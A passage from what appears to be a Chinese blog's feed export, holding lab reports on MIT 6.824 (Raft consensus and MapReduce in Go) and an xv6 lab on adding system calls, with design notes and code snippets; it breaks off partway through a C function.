<p>我认为正确的解决方法，是像我一样，将日志的 raft 提交和应用层提交区分开。<code>AppendEntries</code> 只改 <code>commitIndex</code>，后台线程发现 <code>commitIndex&gt;lastApplied</code>，去向应用层提交。由于提交到应用层这一过程，只在单线程里发生，可以严格保证顺序。</p>
<p>此外，这种方案还有一个优点，就是避免应用层接收故障影响 raft 层。对于 leader 来说，如果它也是同步提交到应用层，那么如果应用层的接受出现问题，就会阻塞 leaderHeartbeat 线程，使得 leader 无法服务。这也是有问题。改为异步后台线程后，raft 层就不会受到影响。</p>
<h2 id="a-leader-选举">2A leader 选举</h2>
<p>这个实验要求实现 leader 的选举相关逻辑，以及 leader 的心跳功能（抑制选举）。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> RequestVoteArgs <span class="keyword">struct</span> {</span><br><span class="line">	<span class="comment">// Your data here (2A, 2B).</span></span><br><span class="line">	Term         <span class="keyword">int</span> <span class="comment">// Candidate 的 Term ID</span></span><br><span class="line">	CandidateId  <span class="keyword">int</span> <span class="comment">// Candidate 的 ID</span></span><br><span class="line">	LastLogIndex <span class="keyword">int</span> <span class="comment">// Candidate 所持有的最后一条日志记录的 index</span></span><br><span class="line">	LastLogTerm  <span class="keyword">int</span> <span class="comment">// Candidate 所持有的最后一条日志记录的 Term ID</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// example RequestVote RPC reply structure.</span></span><br><span class="line"><span class="comment">// field names must start with capital letters!</span></span><br><span class="line"><span class="keyword">type</span> RequestVoteReply <span class="keyword">struct</span> {</span><br><span class="line">	<span class="comment">// Your data here (2A).</span></span><br><span class="line">	Term        <span class="keyword">int</span>  <span class="comment">// 接收方的 Term ID</span></span><br><span class="line">	VoteGranted <span class="keyword">bool</span> <span class="comment">// 接收方是否同意给出选票</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>处理流程如 raft 论文里描述的，</p>
<blockquote>
<p>接收方在接收到该 RPC 后会进行以下操作：</p>
<ol type="1">
<li>若 <code>term &lt; currentTerm</code>，返回 <code>false</code></li>
<li>若 <code>votedFor == null</code> 且给定的日志记录信息可得出对方的日志和自己的相同甚至更新，返回 <code>true</code></li>
</ol>
</blockquote>
<p>注意，这里的<code>日志和自己的相同甚至更新</code>，是通过最后一条日志的任期和索引判断的，也就是 <code>LastLogTerm</code> 和 <code>LastLogIndex</code>。逻辑是，先判断任期大的更新，任期相同，则日志索引大的更新。</p>
<p>还需要注意的是，下面这条规则是通用的，<strong>优先级最高</strong>的。</p>
<blockquote>
<p>对于所有节点：</p>
<ul>
<li>若 RPC 请求或相应内容中携带的 <code>term &gt; currentTerm</code>，则令 <code>currentTerm = term</code>，且 Leader 降级为 Follower</li>
</ul>
</blockquote>
<p>更详细一点描述，对于请求的 <code>term</code>：</p>
<ul>
<li>如果 <code>term &gt; currentTerm</code>，说明自身的任期落后，需要追上令 <code>currentTerm = term</code>，且 Leader 降级为 Follower，且将 <code>voteFor</code> 置空。因为在任期改变后，投票、角色信息都要清空</li>
<li>如果 <code>term&lt;currentTerm</code>，说明请求是过时的节点发出的，不予处理，并<strong>将自己的 <code>currentTerm</code> 写在响应中，让对方意识到自己落后了</strong>。</li>
</ul>
<p>建议抽为一个函数，集中处理这块的逻辑。</p>
<p>2A 整体还比较简单，没有太大的坑。</p>
<h2 id="b-日志">2B 日志</h2>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> AppendEntriesRequest <span class="keyword">struct</span> {</span><br><span class="line">	Term         <span class="keyword">int</span>        <span class="comment">//Leader 的 Term ID</span></span><br><span class="line">	LeaderId     <span class="keyword">int</span>        <span class="comment">// Leader 的 ID</span></span><br><span class="line">	PrevLogIndex <span class="keyword">int</span>        <span class="comment">// 在正在备份的日志记录之前的日志记录的 index 值</span></span><br><span class="line">	PrevLogTerm  <span class="keyword">int</span>        <span class="comment">// 在正在备份的日志记录之前的日志记录的 Term ID</span></span><br><span class="line">	Entries      []LogEntry <span class="comment">// 正在备份的日志记录</span></span><br><span class="line">	LeaderCommit <span class="keyword">int</span>        <span class="comment">// Leader 已经提交的最后一条日志记录的 index 值</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AppendEntriesReply <span class="keyword">struct</span> {</span><br><span class="line">	Term    <span class="keyword">int</span>  <span class="comment">// 接收方的当前 Term ID</span></span><br><span class="line">	Success <span class="keyword">bool</span> <span class="comment">// 当 Follower 能够在自己的日志中找到 index 值和 Term ID 与 prevLogIndex 和 prevLogTerm 相同的记录时为 true</span></span><br><span class="line">	XTerm   <span class="keyword">int</span>  <span class="comment">// term in the conflicting entry (if any)</span></span><br><span class="line">	XIndex  <span class="keyword">int</span>  <span class="comment">// index of first entry with that term (if any)</span></span><br><span class="line">	XLen    <span class="keyword">int</span>  <span class="comment">// log length</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>处理流程如 raft 论文里描述的：</p>
<blockquote>
<p>接收方在接收到该 RPC 后会进行以下操作：</p>
<ol type="1">
<li>若 <code>term &lt; currentTerm</code>，返回 <code>false</code></li>
<li>若日志中不包含 index 值和 Term ID 与 <code>prevLogIndex</code> 和 <code>prevLogTerm</code> 相同的记录，返回 <code>false</code></li>
<li><strong>如果日志中存在与正在备份的日志记录相冲突的记录</strong>（有相同的 index 值但 Term ID 不同），删除该记录以及之后的所有记录</li>
<li>在保存的日志后追加新的日志记录</li>
<li>若 <code>leaderCommit &gt; commitIndex</code>，令 <code>commitIndex</code> 等于 <code>leaderCommit</code> 和最后一个新日志记录的 index 值之间的最小值</li>
</ol>
</blockquote>
<p>这里有一个坑是加粗的地方，只有在<strong>有冲突</strong>的情况下，才会对 follower 的节点进行截断处理。这里的冲突时指有相同的 index 值但 Term ID 不同，而不是 <code>command</code> 的值不同，注意，<strong>任何时候不能用 <code>command</code> 的值去做判断逻辑</strong>。Raft 本身对应用层应该是一无所知的。</p>
<p>最开始的话，容易想当然，如果前一个节点是匹配的，我直接把当前节点后面的都丢掉，全盘接收 leader 传过来的日志不就行了，为什么还要去判断冲突呢？原因是，follower 可能收到过期的 <code>AppendEntries</code> 请求，直接截断可能会导致丢弃掉部分日志，例如 follower 已经告诉 leader 自己成功接收的，就会出现问题。</p>
<p>这里还可能出现的问题是，data race。如果开了 <code>-race</code> flag，就会发现有时候会在 <code>AppendEntries</code> 处理过程中报 race，明明已经加了锁了。代码示例可能如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">AppendEntries</span><span class="params">(args *AppendEntriesRequest, reply *AppendEntriesReply)</span></span> {</span><br><span class="line">    rf.Lock()</span><br><span class="line">    <span class="keyword">defer</span> rf.Unlock()</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    rf.logs=<span class="built_in">append</span>(rf.logs[:x], args.Entries...) <span class="comment">// race</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这是由于，在 go 中，切片的截断操作是复用底层数据的。Entries、logs 的切片截断，都会间接持有 logs 的引用，进而在某些区域出现读写 race 问题。解决方法是把 log 复制到别的地方，再做截断。</p>
<p>还有一个点，论文里的描述会晦涩一点：</p>
<blockquote>
<p>对于 Leader：</p>
<p>如果存在一个值 <code>N</code>，使得 <code>N &gt; commitIndex</code>，且大多数的 <code>matchIndex[i] &gt;= N</code>，且 <code>log[N].term == currentTerm</code>，令 <code>commitIndex = N</code></p>
</blockquote>
<p>这个说的是，如果 leader 发现，超半数以上的节点都接收到了 N 索引以上的日志，且 N 日志是在当前任期产生的，那么就对 N 之前的日志进行提交。具体实现上，可以将 <code>matchIndex</code> 排序，取中值即可。</p>
<h2 id="c-持久化">2C 持久化</h2>
<p>正如论文里描述的，持久化的信息有三种</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">currentTerm       <span class="keyword">int</span>        <span class="comment">// 当前 Term ID（初值为 0）</span></span><br><span class="line">votedFor          <span class="keyword">int</span>        <span class="comment">// 该 Term 中已接收到来自该节点的选票的 Candidate ID</span></span><br><span class="line">logs              []LogEntry <span class="comment">// 日志记录。第一个日志记录的 index 值为 1</span></span><br></pre></td></tr></tbody></table></figure>
<p>这个比较明确，接下来需要思考的是，什么时候持久化。</p>
<p>思考后不难想出，在这些变量发生变化之后，都需要持久化。其实再进一步思考，可以发现，<strong>raft 节点的变化，只有被其他节点感知到，才是有效的</strong>。换而言之，如果一个 raft 节点内部一直在变化状态，但是由于网络问题，这些状态无法传给其他节点，那么也无需保存了。再进一步，raft 间感知状态只有通过 rpc 调用这一种方式，因此可以在处理 rpc 的逻辑之后，进行持久化。</p>
<p>容易疏忽的是，在 leader 提交日志后，也需要持久化，这里相当于其他节点的 <code>AppendEntries</code> 了，需要对等处理。</p>
<p>日志的快恢复算法可以参考老师上课的讲义，描述的比较清楚了已经。</p>
<h2 id="d-日志快照">2D 日志快照</h2>
<p>日志快照本身的思想很简单，但是实现逻辑却相当复杂。首先要思考一个问题，快照的 <code>lastIncludedTerm/lastIncludedIndex</code> 需要持久化嘛？</p>
<p>答案是要的，考虑特殊情况，如果一个节点内的所有日志都存到了快照里，本地一个日志都没有了。这个时候，来了一个投票请求，这个节点要怎么决定是否同意呢？也可以反过来，如果这个节点要开启一轮选举，<strong>怎么得到它的日志进度呢</strong>？</p>
<p>因此，持久化这些信息是有必要的。这个实验最复杂的逻辑是：日志索引和 logs 位置的映射，日志找不到怎么处理。这一部分改起来会比较痛苦，如果前面没有预留一些设计空间的话，就需要重构。剩下还有一些历史逻辑，比如和持久化、快恢复的搭配，也需要思考清楚。</p>
<h2 id="一些建议">一些建议</h2>
<p>下面是我个人对于这个 lab 的一些建议，实在一点：</p>
<ol type="1">
<li>绝对、绝对不要<strong>持有锁做任何可能阻塞的事情</strong>，包括不限于 RPC、channel 操作等。死锁往往就是这么发生的。</li>
<li><strong>将需要加锁和不需要加锁的函数分开命名</strong>，例如 <code>getMaxLogIndexWithLock</code>，<code>getMaxLogIndexWithoutLock</code>。这是由于 go 的锁不支持重入，反复加锁也会死锁。分开命名可以提醒自己在不同的情况，调不同的函数。</li>
<li><strong>最小化加锁逻辑</strong>。加锁仅限于共享变量的读写，读写完毕后即可释放。Raft 的正确性可以通过任期保证过期数据不会产生恶劣影响，无需担心。</li>
<li>多用 <code>DPrintf</code>，只有日志是你唯一的依靠（，建议用 nohup 把日志放在文件里，方便分析</li>
</ol>
<p>最后做完这个 lab，能百余次通过测试，还是很有成就感的。希望本篇可以帮到大家！</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://mr-dai.github.io/raft/#日志压缩">Raft 总结 - Robert Peng's Blog (mr-dai.github.io)</a></li>
<li><a href="https://thesquareplanet.com/blog/students-guide-to-raft/">Students' Guide to Raft :: Jon Gjengset (thesquareplanet.com)</a></li>
<li><a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-824/lecture-06-raft1/6.2-guo-ban-piao-jue-majority-vote">6.2 过半票决（Majority Vote） - MIT6.824 (gitbook.io)</a></li>
<li><a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-824/lecture-06-raft1/6.5-ri-zhi-raft-log">6.5 日志（Raft Log） - MIT6.824 (gitbook.io)</a></li>
<li><a href="https://mit-public-courses-cn-translatio.gitbook.io/mit6-824/lecture-07-raft2/7.5-ri-zhi-kuai-zhao-log-snapshot">7.5 日志快照（Log Snapshot） - MIT6.824 (gitbook.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>MIT 6.824</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>MIT 6.824</tag>
        <tag>Raft</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.824 Lab1 实验报告: MapReduce</title>
    <url>/blog/2023/07/05/MIT-6-824-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT 6.824 Lab1 的实验报告。MIT 6.824 是一门分布式系统的课程 ，最近打算系统地学习一下，我把课程资源放在了博客末尾，感兴趣的同学也可以一起来学。Lab 1 中，要求用 Golang 实现一个 MapReduce 的框架。</p>
<span id="more"></span>
<p>遵循课程规定，本文没有放出核心代码，只介绍了一些结构设计和流程思考，可放心食用。</p>
<h2 id="实验准备">实验准备</h2>
<h3 id="拉取代码">拉取代码</h3>
<p>在实验指导书中 <a href="https://pdos.csail.mit.edu/6.824/labs/lab-mr.html">6.5840 Lab 1: MapReduce (mit.edu)</a>，包含了代码库的地址和一些简单介绍。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git://g.csail.mit.edu/6.5840-golabs-2023 6.5840</span><br><span class="line">$ <span class="built_in">cd</span> 6.5840</span><br><span class="line">$ ls</span><br><span class="line">Makefile src</span><br><span class="line">$</span><br></pre></td></tr></tbody></table></figure>
<h3 id="代码骨架介绍">代码骨架介绍</h3>
<p>以 <code>src</code> 为当前目录，Lab 1 里需要关注的是以下几个部分：</p>
<ul>
<li><code>mr/</code>：MapReduce 的核心逻辑，包含协调器（Coordinator）、Worker、RPC 三部分，需要自己实现。</li>
<li><code>mrapps/</code>：MapReduce 的应用，用于测试，例如 <code>wc.go</code> 就是单词计数（WordCount）</li>
<li><code>main/mrsequential.go</code>：MapReduce 的串行启动版本，可以参考一些文件读写的代码</li>
<li><code>main/mrcoordinator.go, main/mrworker.go</code>：coordinator、worker 的启动类</li>
</ul>
<h3 id="理论知识">理论知识</h3>
<p>MapReduce 框架中，包含两种角色和两个阶段（两种任务）。</p>
<p>两个阶段：</p>
<ul>
<li>Map 阶段：对分块文件运行 Map 函数
<ul>
<li>函数签名：<code>func Map(filename string, contents string) []mr.KeyValue</code></li>
<li>接收文件名、文件内容为参数，返回 [key,value] 的列表</li>
</ul></li>
<li> Reduce 阶段：对同一个 KEY 的 VALUE 聚合结果进行规约计算
<ul>
<li>函数签名：<code>func Reduce(key string, values []string) string</code></li>
<li>key 为 Map 阶段产生的某个 key，values 为 Map 阶段该 key 对应的所有 value 的列表</li>
</ul></li>
<li><strong> Reduce 阶段必须在所有 Map 任务都完成之后才能开始</strong>，否则会丢失数据</li>
</ul>
<p>两种角色是 Coordinator 和 Worker：</p>
<ul>
<li>Coordinator：负责协调任务的执行，将 Map/Reduce 任务下发给 Worker，监听 Worker 状态，如果 Worker 宕机对相关任务进行重新下发</li>
<li> Worker：负责任务的执行，以心跳与 Coordinator 周期交互</li>
</ul>
<p>整体的流程如下：</p>
<ol type="1">
<li>Coordinator 得到输入文件的切片</li>
<li> Coordinator 向 Worker 发送 Map 任务</li>
<li> Worker 上报 Map 任务执行完成，中间结果存储在 Intermediate Files 中</li>
<li><strong>所有 Map 任务执行完毕后</strong>，Coordinator 对同一个 key 的中间结果进行聚合，下发 Reduce 任务</li>
<li> Worker 上报 Reduce 任务执行完成，结果写到输出文件中</li>
<li>所有 Reduce 任务执行完毕，退出</li>
</ol>
<p><img src="mapreduce_architecture.png"></p>
<p>需要注意的是，Worker 可能由于种种原因宕机，所以需要做容错处理。Coordinator 与 Worker 保持心跳，在发现心跳超时一定阈值后，需要把 Worker 标记为已下线，重新下发任务。</p>
<p>另外，考虑 Worker 宕机的时机，如果 Worker 在写入 Reduce 的输出结果时宕机，写了一半的文件可能会产生误解，指导书里的建议是先把结果写到临时文件中，等到运行结束再重命名。</p>
<h2 id="rpc">RPC</h2>
<p>首先需要思考的是，Coordinator 和 Worker 间的通信有几种。目前的架构下，只能由 Worker 主动向 Coordinator 发起请求，获得回应，消息种类可能是：</p>
<ul>
<li>请求一个任务</li>
<li>上报心跳</li>
<li>上报任务结果</li>
</ul>
<p>需要在 RPC 文件里定义好这些请求的 request 和 reply，例如，任务请求的例子如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> AcquireTaskRequest <span class="keyword">struct</span> {</span><br><span class="line">	WorkerCode <span class="keyword">string</span> <span class="comment">// worker id</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> AcquireTaskReply <span class="keyword">struct</span> {</span><br><span class="line">	Mode    <span class="keyword">int8</span>     <span class="comment">// 任务模式</span></span><br><span class="line">	Files   []<span class="keyword">string</span> <span class="comment">// 输入</span></span><br><span class="line">	NReduce <span class="keyword">int</span>      <span class="comment">//  reduce桶数量</span></span><br><span class="line">	TaskId  <span class="keyword">string</span>   <span class="comment">// 任务Id</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>设计上，worker 侧最好带有一个唯一的 code，方便追踪和排错，任务也是。此外，任务还需要指定一个执行模式，map/reduce/ 其他。由于 go 没有枚举类型，这里用一个 int8 表示。稍加设计，可以发现任务类型可分为四种：</p>
<ul>
<li>map</li>
<li>reduce</li>
<li>wait：要求 worker 等待一段时间，后续可能会有任务</li>
<li> done；要求 worker 退出，后续不可能有任务了</li>
</ul>
<p>类似地，可以定义心跳、任务结果上报的请求和响应，这里就省去了。考虑到上报结果和请求任务总是成对出现的，设计上也可以进行合并。</p>
<h2 id="coordinator">Coordinator</h2>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Task <span class="keyword">struct</span> {</span><br><span class="line">	Id           <span class="keyword">string</span>    <span class="comment">// 任务Id</span></span><br><span class="line">	Mode         <span class="keyword">int8</span>      <span class="comment">// 运行模式</span></span><br><span class="line">	Files        []<span class="keyword">string</span>  <span class="comment">// 输入文件</span></span><br><span class="line">	WorkerCode   <span class="keyword">string</span>    <span class="comment">// 运行Worker的标识</span></span><br><span class="line">	LastBeatTime time.Time <span class="comment">// 最后一次心跳时间</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Coordinator <span class="keyword">struct</span> {</span><br><span class="line">	sync.Mutex                          <span class="comment">// 互斥锁</span></span><br><span class="line">	Files              []<span class="keyword">string</span>         <span class="comment">// 分片文件</span></span><br><span class="line">	NReduce            <span class="keyword">int</span>              <span class="comment">// reduce 桶数</span></span><br><span class="line">	RunningTaskMap     <span class="keyword">map</span>[<span class="keyword">string</span>]*Task <span class="comment">// 运行中的任务</span></span><br><span class="line">	PendingTasks       []*Task          <span class="comment">// 待运行的任务</span></span><br><span class="line">	MapDone            <span class="keyword">bool</span>             <span class="comment">// Map阶段是否结束</span></span><br><span class="line">	ReduceDone         <span class="keyword">bool</span>             <span class="comment">// Reduce阶段是否结束</span></span><br><span class="line">	ReduceFiles        <span class="keyword">map</span>[<span class="keyword">int</span>][]<span class="keyword">string</span> <span class="comment">// Reduce桶的中间文件</span></span><br><span class="line">	LastWorkerBeatTime time.Time        <span class="comment">// 最后一次Worker心跳时间</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>Coordinator 包含两种 goroutine，rpc 处理的 goroutine、主 goroutine，需要加锁避免竞态条件、保证可见性。</p>
<p>Coordinator 的流程如下：</p>
<ul>
<li>初始化 Map 任务</li>
<li>当 Worker 请求任务时：
<ul>
<li>如果有待执行的 map / 任务，下发</li>
<li>如果没有待执行的 map 任务，且还处在 map 阶段，要求 worker 等待</li>
<li>如果在 reduce 阶段，下发待执行的 reduce 任务，<strong>不存在在要求 worker 等待</strong></li>
</ul></li>
<li>当 Worker 上报任务结果时
<ul>
<li>如果 map 任务全部执行完毕，切换到 reduce 阶段，初始化 reduce 任务</li>
<li>如果 reduce 任务全部执行完毕，退出</li>
</ul></li>
</ul>
<p>此外，需要有一个后台 goroutine 扫描失联的任务，重新下发，这也是为什么没有任务时要求 worker 等待。</p>
<p>需要注意的是，在 Golang 中，由于没有 <code>volatile</code> 这样的字段可以保证可见性，因此要对于共享变量的读写都要加锁来保证可见性。由于 Coordinator 侧没有很重的业务计算逻辑，加锁时间不会太长，可以接受。</p>
<h2 id="worker">Worker</h2>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> worker <span class="keyword">struct</span> {</span><br><span class="line">	sync.Mutex</span><br><span class="line">	WorkerCode  <span class="keyword">string</span>                          <span class="comment">// worker id</span></span><br><span class="line">	TaskId      <span class="keyword">string</span>                          <span class="comment">// task id</span></span><br><span class="line">	Mode        <span class="keyword">int8</span>                            <span class="comment">// 任务模式</span></span><br><span class="line">	InputFiles  []<span class="keyword">string</span>                        <span class="comment">// 任务输入文件</span></span><br><span class="line">	ReduceFiles [][]<span class="keyword">string</span>                      <span class="comment">// reduce输出</span></span><br><span class="line">	Done        <span class="keyword">bool</span>                            <span class="comment">// 任务执行结束</span></span><br><span class="line">	MapF        <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>, <span class="keyword">string</span>)</span> []<span class="title">KeyValue</span> // <span class="title">map</span>函数</span></span><br><span class="line">	ReduceF     <span class="function"><span class="keyword">func</span><span class="params">(<span class="keyword">string</span>, []<span class="keyword">string</span>)</span> <span class="title">string</span>   // <span class="title">reduce</span>函数</span></span><br><span class="line">	NReduce     <span class="keyword">int</span>                             <span class="comment">// reduce 桶数量</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>Worker 侧存在两个 goroutine，任务执行和心跳维护。</p>
<p>在 Worker 侧的主逻辑里，需要重复执行：</p>
<ul>
<li>请求任务</li>
<li>根据任务类型、执行任务并上报结果</li>
</ul>
<p>在心跳维护组件里，每隔一段时间上报任务的心跳（任务 Id）。</p>
<p>可以发现，<code>TaskId</code> 作为共享变量、也需要加锁才能保证可见性。但是需要额外考虑的是，Worker 侧可能有耗时的计算逻辑，如果对函数整个加锁，心跳线程长时间获取不到锁就会阻塞，就出问题了。</p>
<p>因此，<strong>需要尽量缩小锁的范围</strong>。<strong>锁的目的是保护共享变量的读写</strong>，分析可知，这种情况下，共享变量只有 <code>TaskId</code>，因此，可以抽一个函数，只对获取 <code>TaskId</code> 这一步加锁，就可以避免锁范围太大导致的问题。</p>
<h2 id="课程资源">课程资源</h2>
<ul>
<li>课程首页：<a href="https://pdos.csail.mit.edu/6.824/schedule.html">6.5840 Schedule: Spring 2023 (mit.edu)</a></li>
<li>b 站课程视频：<a href="https://www.bilibili.com/video/BV1R7411t71W/?p=1&amp;vd_source=05e9e6106f7d1eabead6a8b9f4ab5820">Lecture 1- Introduction_哔哩哔哩_bilibili</a></li>
<li>Lab 1 指导书：<a href="https://pdos.csail.mit.edu/6.824/labs/lab-mr.html">6.5840 Lab 1: MapReduce (mit.edu)</a></li>
</ul>
]]></content>
      <categories>
        <category>MIT 6.824</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>MIT 6.824</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title>XV6-Lab-2 实验报告: Lab: system calls</title>
    <url>/blog/2023/05/25/XV6-Lab-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 xv6 的第 2 个 lab，通过增加自定义的系统调用，了解系统调用的链路及原理。就实验内容本身来说，难度不高，也只包含两个 exercise。</p>
<span id="more"></span>
<h2 id="原理及分析">原理及分析</h2>
<p>我们知道，系统调用是操作系统内核提供的接口，提供封装好的底层功能。然而，<strong>系统调用的函数或者地址不是直接暴露给用户的</strong>。内核只是提供了一个统一的系统调用入口，称为 <code>ECALL</code>。ECALL 接收一个数字参数，当一个用户程序想要将程序执行的控制权转移到内核，它只需要执行 <code>ECALL</code> 指令，并传入一个数字。这里的数字参数代表了应用程序想要调用的系统调用。这样的设计有很多优点，最直观的是，可以在 <code>ECALL</code> 内调用系统调用前，进行参数检查或者权限检查，避免非法的调用。</p>
<p>在 xv6 中，这些 “系统调用号” 声明于 <code>kernel/syscall.h</code>，例子如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// System call numbers</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_fork    1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_exit    2</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>kernel/syscall.c</code> 中，<code>syscall</code> 根据调用号执行对应的系统调用，代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) {</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %s: unknown sys call %d\n"</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p><code>trapframe</code> 保存了程序陷入内核前的寄存器信息，系统调用是一种主动的陷入内核的做法。在上述 <code>syscall</code> 函数中，读取了调用号，若合法则跳转并设置返回值。<code>syscalls</code> 是一个数组，将系统调用号和具体的函数进行对应。这些函数实现在不同的文件中：进程相关的调用（如 <code>fork</code>），实现在 <code>kernel/sysproc.c</code> 中，文件相关的调用（如 <code>fstat, read, write</code>），实现在 <code>kernel/file.c</code> 中。</p>
<p>在 C 语言中，函数参数里的 void，表明函数不接收任何参数。如果没有 void 的话，<code>void syscall()</code> 表明函数可以接收任意参数。</p>
<p>在用户态，系统调用在 <code>user/user.h</code> 中声明，用于链接。<code>user/usys.pl</code> 是所谓的系统调用桩（stub），通过 <code>kernel/syscall.h</code>，将系统调用转化为对应调用号的 <code>ECALL</code> 的调用。该文件会被编译为 <code>user/usys.S</code>，片段如下。能够看出是声明的系统调用代码，通过 RISC-V 的 <code>ecall</code> 指令陷入内核。<code>ecall</code> 会跳转到异常处理的地址，这个地址是通过硬件编程写入的。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># generated by usys.pl - do not edit</span><br><span class="line">#include "kernel/syscall.h"</span><br><span class="line">.global fork</span><br><span class="line">fork:</span><br><span class="line"> li a7, SYS_fork # 设置系统调用号</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global exit</span><br><span class="line">exit:</span><br><span class="line"> li a7, SYS_exit</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br></pre></td></tr></tbody></table></figure>
<p>如此一来，整个系统调用的流程就串起来了：</p>
<ol type="1">
<li><code>user/user.h</code> 中的声明</li>
<li><code>user/usys.pl</code> 的系统调用桩，设置系统调用号</li>
<li>中断处理逻辑</li>
<li><code>kernel/syscall.c</code> 的 <code>syscall</code> 函数</li>
<li>对应的系统调用函数</li>
</ol>
<p>相应地，如果需要新加系统调用，也得按这个流程来。os 处理中断的逻辑与系统调用不直接相关，可以后面再理解。</p>
<h2 id="exercises">Exercises</h2>
<h3 id="trace">trace</h3>
<p>要求实现一个系统调用，能够根据一个 mask，监控某个进程对应系统调用执行结果，并打印。对于该进程创建的子进程，监控同样生效。</p>
<p>简单思考之后，不难想到这个调用需要更新一个<strong>进程级别的状态</strong>，在系统调用结束时，根据这个状态决定是否打印相关信息；在<strong>创建子进程时，需要传播这个状态</strong>。进程级的状态，最简单的是直接保存在进程结构体中，<code>kernel/proc.c</code> 中，<code>proc</code> 结构体维护了进程状态，包含锁、pid、页表等。可以在这个结构中新加一个字段，保存这个 mask。系统调用函数如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// trace system calls of given mask</span></span><br><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> mask;</span><br><span class="line">  <span class="keyword">if</span> (argint(<span class="number">0</span>, &amp;mask) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  myproc()-&gt;tracemask = mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>需要注意的是，内核里系统调用的传参机制比较特殊，不是声明在函数里，而是通过 <code>argint, argaddr</code> 这种函数读参，猜测与中断的机制有关。</p>
<p>然后在 <code>syscall</code> 函数中的系统调用执行完毕后，根据 mask 判断是否打印信息即可。这里还需要维护一个系统调用号到系统调用名的数组 <code>sysname</code>，方便打印调用名。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span> (num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num])</span><br><span class="line">  {</span><br><span class="line">    